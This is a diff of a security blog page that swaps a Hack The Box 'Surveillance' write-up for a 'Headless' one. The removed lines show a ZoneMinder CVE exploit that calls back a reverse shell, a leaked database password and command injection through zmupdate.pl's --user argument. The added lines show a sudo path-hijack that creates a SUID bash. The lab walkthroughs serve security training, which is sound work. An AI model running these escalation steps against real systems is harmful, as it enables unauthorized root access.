-❯ cd CVE-2023-26035
-❯ python3 exploit.py -t http://localhost:8080 -ip 10.10.14.114 -p 443
-</code></pre>
-
-<p><img src="/assets/images/Surveillance/rce_as_zoneminder.png" alt="RCE as zoneminder"></p>
-
-<p>And remember to stabilize the TTY as before</p>
     
       <h1 id="access-as-root">
         
@@ -731,125 +724,145 @@ matthew@surveillance:/tmp$ wget http://&lt;YOUR IP&gt;/chisel
         
       </h1>
 
-<p>Looking at the sudo privileges we can see that we can run any zoneminder perl script under /usr/bin/</p>
+<p>Looking at the sudo privileges, we can see that we can run as any user without a password <code>/usr/bin/syscheck</code>:</p>
 
-<pre><code class="language-bash">zoneminder@surveillance:~$ sudo -l
-Matching Defaults entries for zoneminder on surveillance:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+<pre><code class="language-bash">dvir@headless:~$ sudo -l
+Matching Defaults entries for dvir on headless:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
 
-User zoneminder may run the following commands on surveillance:
-    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
+User dvir may run the following commands on headless:
+    (ALL) NOPASSWD: /usr/bin/syscheck
 </code></pre>
 
-<p>We can see the password of zoneminder user for the MySQL database in <code>/usr/share/zoneminder/www/api/Config/database.php</code></p>
+<p>Running it gives us some info about the system, such as the last kernel modification time, free space on disk and seems to try to run some database service:</p>
 
-<pre><code class="language-php">zoneminder@surveillance:/usr/share/zoneminder/www/api/app/Config$ cat database.php
-&lt;?php
-&lt;SNIP&gt;
-class DATABASE_CONFIG {
-
-	/*public $default = array(
-		'datasource' =&gt; 'Database/Mysql',
-		'persistent' =&gt; false,
-		'login' =&gt; ZM_DB_USER,
-		'password' =&gt; ZM_DB_PASS,
-		'database' =&gt; ZM_DB_NAME,
-		'ssl_ca' =&gt; ZM_DB_SSL_CA_CERT,
-		'ssl_key' =&gt; ZM_DB_SSL_CLIENT_KEY,
-		'ssl_cert' =&gt; ZM_DB_SSL_CLIENT_CERT,
-		'prefix' =&gt; '',
-		'encoding' =&gt; 'utf8',
-	);*/
-
-	public $test = array(
-		'datasource' =&gt; 'Database/Mysql',
-		'persistent' =&gt; false,
-		'host' =&gt; 'localhost',
-		'login' =&gt; 'zmuser',
-		'password' =&gt; 'ZoneMinderPassword2023',
-		'database' =&gt; 'zm',
-		'prefix' =&gt; '',
-		//'encoding' =&gt; 'utf8',
-	);
-
-	public function __construct() {
-		if (strpos(ZM_DB_HOST, ':')):
-			$array = explode(':', ZM_DB_HOST, 2);
-                        if (ctype_digit($array[1])):
-				$this-&gt;default['host'] = $array[0];
-				$this-&gt;default['port'] = $array[1];
-			else:
-				$this-&gt;default['unix_socket'] = $array[1];
-			endif;
-		else:
-			$this-&gt;default['host'] = ZM_DB_HOST;
-		endif;
-	}
-}
+<pre><code class="language-bash">dvir@headless:~$ sudo /usr/bin/syscheck
+Last Kernel Modification Time: 01/02/2024 10:05
+Available disk space: 2.0G
+System load average:  0.12, 0.03, 0.01
+Database service is not running. Starting it...
 </code></pre>
 
-<p>Looking at the perl scripts, we can see that the script zmupdate.pl uses the –pass parameter (line 416) to execute the command mysql escaping it with quotes which is a nice sanitization. But the –user parameter (line 415) is used without any validations so it is vulnerable to command injection in the –user parameter:</p>
+<p>This file is a shell script:</p>
 
-<p><img src="/assets/images/Surveillance/zmupdate_vulnerable_rce.png" alt="zmupdate vulnerable"></p>
+<pre><code class="language-bash">dvir@headless:~$ file /usr/bin/syscheck 
+/usr/bin/syscheck: Bourne-Again shell script, ASCII text executable
+</code></pre>
 
-<p>And now, with the password, we can exploit it in the zmupdate.pl –user parameter:</p>
+<p>First, if the user id’s its not root, exits the program:</p>
 
-<pre><code class="language-bash">zoneminder@surveillance:/usr/share/zoneminder/www/api/app/Config$ sudo /usr/bin/zmupdate.pl --version 1 --user='$(chmod u+s /bin/bash)' --pass='ZoneMinderPassword2023'
+<pre><code class="language-bash">#!/bin/bash
 
-Initiating database upgrade to version 1.36.32 from version 1
+if [ "$EUID" -ne 0 ]; then
+  exit 1
+fi
+</code></pre>
 
-WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
-Press enter to continue or ctrl-C to abort : 
+<p>Second, it executes safely some commands to see the last time vmlinux was modified:</p>
 
-Do you wish to take a backup of your database prior to upgrading?
-This may result in a large file in /tmp/zm if you have a lot of events.
-Press 'y' for a backup or 'n' to continue : y
-Creating backup to /tmp/zm/zm-1.dump. This may take several minutes.
-mysqldump: Got error: 1698: "Access denied for user '-pZoneMinderPassword2023'@'localhost'" when trying to connect
-Output: 
-Command 'mysqldump -u$(chmod u+s /bin/bash) -p'ZoneMinderPassword2023' -hlocalhost --add-drop-table --databases zm &gt; /tmp/zm/zm-1.dump' exited with status: 2
-zoneminder@surveillance:/usr/share/zoneminder/www/api/app/Config$ bash -p
-bash-5.1# whoami
+<pre><code class="language-bash">last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
+formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
+/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
+</code></pre>
+
+<p>Also see the available disk space and system load average (also safely):</p>
+
+<pre><code class="language-bash">disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
+/usr/bin/echo "Available disk space: $disk_space"
+
+load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
+/usr/bin/echo "System load average: $load_average"
+</code></pre>
+
+<p>Finally, it checks if initdb.sh its running and if not, it runs ./initdb.sh to start it:</p>
+
+<pre><code class="language-bash">if ! /usr/bin/pgrep -x "initdb.sh" &amp;&gt;/dev/null; then
+  /usr/bin/echo "Database service is not running. Starting it..."
+  ./initdb.sh 2&gt;/dev/null
+else
+  /usr/bin/echo "Database service is running."
+fi
+
+exit 0
+</code></pre>
+
+<p>This is very dangerous since its not calling an absolute path and can execute any bash file in the current directory. I will create initdb.sh in /tmp with a instruction to copy the bash to /tmp and make it SUID. Then, I will execute <code>/usr/bin/syscheck</code> to call ./initdb.sh.</p>
+
+<pre><code class="language-bash">dvir@headless:/tmp$ cd /tmp
+dvir@headless:/tmp$ echo 'cp /bin/bash /tmp; chmod u+s /tmp/bash' &gt; initdb.sh
+dvir@headless:/tmp$ chmod +x initdb.sh 
+dvir@headless:/tmp$ sudo /usr/bin/syscheck
+Last Kernel Modification Time: 01/02/2024 10:05
+Available disk space: 2.0G
+System load average:  0.00, 0.00, 0.00
+Database service is not running. Starting it...
+dvir@headless:/tmp$ ls -l bash 
+-rwsr-xr-x 1 root root 1265648 Jul 21 20:02 bash
+</code></pre>
+
+<p>Finally, I can execute <code>/tmp/bash</code> with <code>-p</code> parameter:</p>
+
+<pre><code class="language-bash">dvir@headless:/tmp$ ./bash -p
+bash-5.2# whoami
 root
-bash-5.1# cd /root/
-bash-5.1# cat root.txt 
-50a1b0211164d8fcfbf20dca6ab3f88d
 </code></pre>
 
-<p>That is all. Hope you liked it!</p>
+<p>And we have access as root! Now we can see root.txt:</p>
+
+<pre><code class="language-bash">bash-5.2# cd /root/
+bash-5.2# cat root.txt 
+b0****************************a6
+</code></pre>
 
 
 <div id="share-links">
   <span id="divider-line">____</span>
   <br><br>
-  <small>17 April 2024</small>
+  <small>20 July 2024</small>
   <div>
     
     Tags:
     
-    <a href="/search?q=craft_cms" class="tag" style="font-family: 'Cascadia Code';">craft_cms</a>
+    <a href="/search?q=xss" class="tag" style="font-family: 'Cascadia Code';">xss</a>
     
-    <a href="/search?q=hash_cracking" class="tag" style="font-family: 'Cascadia Code';">hash_cracking</a>
-    
-    <a href="/search?q=zoneminder_exploit" class="tag" style="font-family: 'Cascadia Code';">zoneminder_exploit</a>
+    <a href="/search?q=command-injection" class="tag" style="font-family: 'Cascadia Code';">command-injection</a>
     
     <a href="/search?q=sudoers" class="tag" style="font-family: 'Cascadia Code';">sudoers</a>
     
-    <a href="/search?q=abusing_zmupdate.pl" class="tag" style="font-family: 'Cascadia Code';">abusing_zmupdate.pl</a>
+    <a href="/search?q=path-hijacking-./" class="tag" style="font-family: 'Cascadia Code';">path-hijacking-./</a>
     
     
 </div>
   <br>
   Share this writeup: 
-  <a href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/2024/HTB/Surveillance.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-facebook-official" aria-hidden="true"></i></a> 
-  <a href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/2024/HTB/Surveillance.html&amp;text=Writeup+for+HTB%20Surveillance%20writeup+from+HTB+held+on+17%20April%202024&amp;hashtags=ctf,writeup,Surveillance,HTB,craft_cms,hash_cracking,zoneminder_exploit,sudoers,abusing_zmupdate.pl','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-twitter" aria-hidden="true"></i></a> 
-  <a href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/2024/HTB/Surveillance.html&amp;text=Writeup+for+HTB%20Surveillance%20writeup+from+HTB+held+on+2024-04-17%2000:00:00%20+0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-linkedin" aria-hidden="true"></i></a>
+  <a href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/2024/HTB/Headless.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-facebook-official" aria-hidden="true"></i></a> 
+  <a href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/2024/HTB/Headless.html&amp;text=Writeup+for+HTB%20Headless%20writeup+from+HTB+held+on+20%20July%202024&amp;hashtags=ctf,writeup,Headless,HTB,xss,command-injection,sudoers,path-hijacking-./','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-twitter" aria-hidden="true"></i></a> 
+  <a href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/2024/HTB/Headless.html&amp;text=Writeup+for+HTB%20Headless%20writeup+from+HTB+held+on+2024-07-20%2000:00:00%20+0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-linkedin" aria-hidden="true"></i></a>
 </div>
     </section>
   </div>
 
   <div id="comments" class="container">
     <section id="disqus_container">
+      
+      <hr>
+      <div id="disqus_thread"></div>
+<script>
+    function disqus_config() {
+        this.callbacks.onReady.push(function() {
+            setSizes();
+        });
+    }
+    (function () {
+        var d = document, s = d.createElement('script');
+        s.src = 'https://captainirs-github-io.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by
+        Disqus.</a>
+</noscript>
       
     </section>
   </div>
